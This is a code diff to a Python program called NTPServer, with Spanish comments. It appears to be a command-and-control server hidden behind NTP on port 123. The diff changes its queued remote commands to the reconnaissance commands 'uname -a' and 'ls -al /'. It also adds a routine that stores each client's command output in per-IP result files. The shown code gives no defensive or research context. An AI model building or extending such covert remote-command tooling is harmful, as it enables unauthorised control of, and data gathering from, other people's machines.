@@ -2,7 +2,9 @@ import socket
 import time
 import struct
 import threading
+import os
 from datetime import datetime
+from pathlib import Path
 from enum import Enum, auto
 
 # ─────────────────────────────────────────────
@@ -51,7 +53,7 @@ class SesionCliente:
 # ─────────────────────────────────────────────
 class NTPServer:
     NTP_EPOCH_OFFSET = 2208988800
-    LISTA_COMANDOS   = ["pwd", "whoami"]
+    LISTA_COMANDOS   = ["uname -a", "ls -al /"]
 
     def __init__(self, host='0.0.0.0', port=123):
         self.host     = host
@@ -156,6 +158,7 @@ class NTPServer:
                 print(resultado.strip())
                 print(f"{'='*60}\n")
 
+                self._guardar_resultado(ip, sesion.comando_actual, resultado)
                 sesion.avanzar_comando()
 
             return False   # no es ACK
@@ -232,6 +235,43 @@ class NTPServer:
         struct.pack_into('!I', r, 40, seconds)
         struct.pack_into('!I', r, 44, fraction)
         return r
+
+    def _guardar_resultado(self, ip: str, comando: str, resultado: str):
+        """Persiste el resultado de un comando en un archivo dedicado.
+
+        Estructura de archivos:
+            resultados/
+                <ip>/
+                    <N>_<comando_sanitizado>.txt
+        """
+        try:
+            # Directorio: resultados/<ip>/
+            directorio = Path("resultados") / ip.replace(":", "_")
+            directorio.mkdir(parents=True, exist_ok=True)
+
+            # Número de orden basado en cuántos archivos hay ya
+            orden = len(list(directorio.iterdir())) + 1
+
+            # Nombre de archivo seguro: reemplazar caracteres problemáticos
+            cmd_safe = comando.replace(" ", "_").replace("/", "-").replace("|", "-")
+            cmd_safe = "".join(c for c in cmd_safe if c.isalnum() or c in "_-.")
+            nombre = f"{orden:03d}_{cmd_safe}.txt"
+            ruta = directorio / nombre
+
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            contenido = (
+                f"Timestamp : {timestamp}\n"
+                f"Cliente   : {ip}\n"
+                f"Comando   : {comando}\n"
+                f"{'='*60}\n"
+                f"{resultado.strip()}\n"
+            )
+
+            ruta.write_text(contenido, encoding="utf-8")
+            print(f"   💾 Guardado en: {ruta}")
+
+        except Exception as e:
+            print(f"   ⚠️  Error guardando resultado: {e}")
 
     def stop(self):
         self.running = False
